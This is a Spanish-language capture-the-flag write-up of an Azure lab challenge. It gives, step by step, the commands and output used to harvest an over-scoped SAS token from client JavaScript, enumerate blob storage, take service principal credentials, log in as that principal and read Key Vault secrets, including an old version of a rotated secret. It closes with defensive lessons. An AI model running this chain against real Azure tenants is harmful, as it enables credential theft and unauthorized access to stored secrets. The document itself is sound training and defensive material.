---
title: "CryptoCabana"
date: 2026-08-04 12:00:00 -0400
description: "Explotación de un SAS token de Azure con alcance excesivo expuesto en JavaScript del cliente, que permite enumerar Blob Storage, filtrar credenciales de un Service Principal y recuperar una versión anterior de un secreto rotado en Azure Key Vault."
categories: [TryHackMe, Hacker Holidays 2026]
tags: [azure, cloud, sas-token, blob-storage, key-vault, service-principal, media]
---

> 📌 **Ficha Técnica**
>
> - **Plataforma:** TryHackMe
> - **Evento/Sala:** Hacker Holidays 2026 — CryptoCabana
> - **Dificultad:** Media
> - **Categoría:** Cloud (Azure)
> - **Técnicas Clave:** Exposición de SAS token en cliente, enumeración de Azure Blob Storage, abuso de scope `srt=sco`, filtración de credenciales de Service Principal, autenticación Azure AD vía Service Principal, enumeración de Azure Key Vault, recuperación de versiones anteriores de secretos rotados
{: .prompt-info }

## Introducción

CryptoCabana es un reto de la categoría **Cloud** del evento Hacker Holidays 2026 de TryHackMe. La narrativa gira en torno a un kiosko turístico que promete "backups seguros" de seed phrases de criptomonedas. Detrás de esa promesa hay una cadena clásica de malas prácticas en Azure: credenciales de acceso incrustadas en código de cliente, permisos de almacenamiento demasiado amplios, y un secreto "rotado" cuya versión anterior nunca fue revocada.

**Objetivo de la sala:**

> Find out what the kiosk is quietly trusting to reach into storage on its own, and see how much further that trust actually extends.

**Target:** `https://cryptocabanaf5scjagc.z13.web.core.windows.net/`

## Preparación del entorno

El reto requiere Azure CLI para interactuar con los servicios objetivo. En Fedora Linux, la instalación es directa desde los repositorios oficiales:

```bash
sudo dnf install -y azure-cli
az --version
```

Con esto se confirma que `az` está disponible y listo para autenticarse contra Azure AD y consultar recursos.

## Reconocimiento

El target es un **Azure Static Website**, identificable por el sufijo del dominio `*.z13.web.core.windows.net`. Antes de interactuar con el formulario visible en la página, se inspeccionó el código fuente:

```bash
curl -s https://cryptocabanaf5scjagc.z13.web.core.windows.net/
```

La página muestra un formulario de "backup de seed phrase" y carga un script externo:

```html
<script src="app.js"></script>
```

Revisar todo lo que la aplicación entrega *antes* de cualquier interacción es un primer paso obligatorio en retos de Cloud/Web: muchas veces la lógica de negocio — y las credenciales que la acompañan — vive en el JavaScript del lado del cliente.

Nunca asumas que el JS de una SPA o de un formulario "simple" está libre de secretos. Revisa siempre el código fuente y los recursos estáticos antes de interactuar con la interfaz.
{: .prompt-tip }

## Explotación

### Hallazgo del SAS Token

Al descargar `app.js`, se encontró que el formulario de "backup" sube directamente el contenido a Azure Blob Storage desde el navegador, usando un **SAS token (Shared Access Signature)** embebido en el propio código:

```javascript
const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";
const BACKUPS_CONTAINER = "backups";
const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=...";
```

Desglosando los parámetros del SAS:

| Parámetro | Valor | Significado |
|---|---|---|
| `ss` | `b` | Servicio: Blob |
| `srt` | `sco` | Alcance: **s**ervice, **c**ontainer, **o**bject |
| `sp` | `rl` | Permisos: **r**ead, **l**ist |
| `se` | `2099-12-31` | Expiración: prácticamente indefinida |

El detalle crítico es `srt=sco`: el token no está limitado al contenedor `backups` que usa la aplicación visible, sino que tiene alcance a nivel de **servicio completo**, permitiendo listar *todos* los contenedores de la cuenta de almacenamiento.

Un SAS token con `srt=sco` y permisos de `list` a nivel de servicio rompe cualquier intención de aislar el acceso a un único contenedor. El scope siempre debe limitarse al mínimo recurso necesario (idealmente `srt=o` para un objeto específico).
{: .prompt-warning }

### Enumeración de Blob Storage

Con el SAS token en mano, se enumeraron los contenedores de la cuenta de almacenamiento vía API REST:

```bash
curl -s "https://cryptocabanaf5scjagc.blob.core.windows.net/?comp=list&sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=..."
```

O de forma más práctica con Azure CLI:

```bash
az storage container list \
  --account-name cryptocabanaf5scjagc \
  --sas-token "sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=..." \
  --output table
```

Resultado:

```text
Name     Lease Status    Last Modified
-------  --------------  -------------------------
$web                     2026-07-16T18:26:22+00:00
backups                  2026-07-16T18:26:22+00:00
vault                    2026-07-16T18:26:23+00:00
```

El contenedor `vault` nunca es referenciado por la aplicación pública — es la "confianza" que se extiende más allá de lo que el kiosko muestra, tal como sugería el brief del reto.

### Filtración de credenciales en el contenedor `vault`

Listando el contenido de `vault`:

```bash
az storage blob list \
  --account-name cryptocabanaf5scjagc \
  --container-name vault \
  --sas-token "..." \
  --output table
```

```text
Name                         Blob Type    Length    Content Type
---------------------------  -----------  --------  ------------------------
backup-service-account.json  BlockBlob    360       application/json
seed_phrase.txt              BlockBlob    88        application/octet-stream
```

Se descargaron ambos archivos:

```bash
az storage blob download \
  --account-name cryptocabanaf5scjagc --container-name vault \
  --name backup-service-account.json --sas-token "..." \
  --file backup-service-account.json
```

`seed_phrase.txt` resultó ser un señuelo narrativo. El archivo relevante fue `backup-service-account.json`, que contiene credenciales completas de un **Service Principal** de Azure AD:

```json
{
  "client_id": "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5",
  "client_secret": "REDACTED",
  "key_vault_name": "ccabana-kv-f5scjagc",
  "key_vault_uri": "https://ccabana-kv-f5scjagc.vault.azure.net/",
  "note": "CryptoCabana backup automation account. Rotate this if it ever leaves the vault. -- IT",
  "tenant_id": "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c"
}
```

La nota interna ("Rotate this if it ever leaves the vault") es una pista narrativa: sugiere que este secreto en particular ya debería haber sido invalidado, lo que se confirma más adelante.

### Autenticación como Service Principal

Con las credenciales filtradas, se inició sesión en Azure CLI usando el flujo de Service Principal:

```bash
az login --service-principal \
  --username "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5" \
  --password "<client_secret>" \
  --tenant "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c"
```

El login fue exitoso, confirmando acceso autenticado a la suscripción `Az-Subs-CTF` con la identidad del Service Principal.

## Post-Explotación: Azure Key Vault

### Enumeración de secretos

```bash
az keyvault secret list --vault-name ccabana-kv-f5scjagc --output table
```

```text
Name         Enabled    Expires
-----------  ---------  -------------------------
key-shard-1  True
key-shard-2  True
key-shard-3  True
master-key   True       2020-01-01T00:00:00+00:00
```

Se intentó leer el valor de cada secreto:

```bash
az keyvault secret show --vault-name ccabana-kv-f5scjagc --name key-shard-1 --query value -o tsv
az keyvault secret show --vault-name ccabana-kv-f5scjagc --name key-shard-2 --query value -o tsv
az keyvault secret show --vault-name ccabana-kv-f5scjagc --name key-shard-3 --query value -o tsv
az keyvault secret show --vault-name ccabana-kv-f5scjagc --name master-key  --query value -o tsv
```

Resultados:

- `key-shard-1` → `THM{n0t_ur`
- `key-shard-3` → `ur_c01ns!}`
- `key-shard-2` → mensaje en lugar del valor real: *"Rotated this after IT flagged it — old value should still be recoverable if you know where to look."*
- `master-key` → `403 Forbidden` (`ForbiddenByRbac`): el Service Principal no tiene el rol RBAC necesario para leer este secreto en el plano de datos.

El bloqueo RBAC sobre `master-key` no impidió resolver la flag, pero es un buen ejemplo de defensa en profundidad: aunque un secreto se filtre, limitar los permisos por rol reduce el impacto real del compromiso.
{: .prompt-info }

### Recuperando la versión anterior de un secreto rotado

Azure Key Vault versiona automáticamente cada secreto; rotar un valor no elimina por defecto las versiones anteriores, solo cambia cuál es la "actual". Se listaron las versiones de `key-shard-2`:

```bash
az keyvault secret list-versions --vault-name ccabana-kv-f5scjagc --name key-shard-2 --output json
```

La salida reveló dos versiones distintas, cada una con su propio `id`/version ID. Se identificó la más antigua por su timestamp de creación y se recuperó su valor:

```bash
az keyvault secret show --vault-name ccabana-kv-f5scjagc \
  --name key-shard-2 \
  --version 3d6492d2c6f74123bc754a9ded22b2a0 \
  --query value -o tsv
```

Resultado: `_k3ys_n0t_`

Rotar un secreto sin **deshabilitar o purgar explícitamente las versiones anteriores** no revoca el acceso a esas versiones si el principal aún tiene permisos de lectura sobre el Key Vault. La rotación es solo la mitad del control.
{: .prompt-warning }

## Flag

Uniendo los tres fragmentos recuperados:

```text
key-shard-1 -> THM{n0t_ur
key-shard-2 -> _k3ys_n0t_
key-shard-3 -> ur_c01ns!}
```

**Flag final:**

```text
THM{n0t_ur_k3ys_n0t_ur_c01ns!}
```

Un guiño directo al dicho clásico del mundo cripto: *"not your keys, not your coins"*.

## Conclusión / Retroalimentación

CryptoCabana es un reto bien diseñado que condensa en una sola cadena varios errores de configuración extremadamente comunes en entornos Azure reales:

1. **Sobre-alcance de SAS tokens**: el error inicial y más determinante de todo el reto. Un token pensado para que un formulario público suba un archivo terminó exponiendo capacidad de listar toda la cuenta de almacenamiento, simplemente por usar `srt=sco` en vez de limitarlo al objeto o contenedor exacto.
2. **Secretos en código de cliente**: cualquier credencial o token embebido en JavaScript servido al navegador debe considerarse público desde el momento en que se despliega, sin importar cuán "oculto" parezca en el flujo normal de la app.
3. **Rotación incompleta de secretos**: el reto ilustra perfectamente por qué rotar un secreto no es suficiente — si las versiones anteriores no se deshabilitan o purgan, siguen siendo accesibles para cualquiera con permisos de lectura sobre el vault.
4. **RBAC como capa de defensa real**: el bloqueo sobre `master-key` mostró que, incluso con credenciales completas de un Service Principal comprometido, una política de mínimo privilegio bien aplicada puede contener parte del daño.

En términos de dificultad, la sala se siente correctamente calibrada como **Media**: no requiere herramientas exóticas, pero sí entender bien la semántica de los SAS tokens y el modelo de versionado de Key Vault, dos conceptos que no siempre se cubren en writeups introductorios de Cloud.

---
*Writeup por Cristhian — Hacker Holidays 2026, TryHackMe*
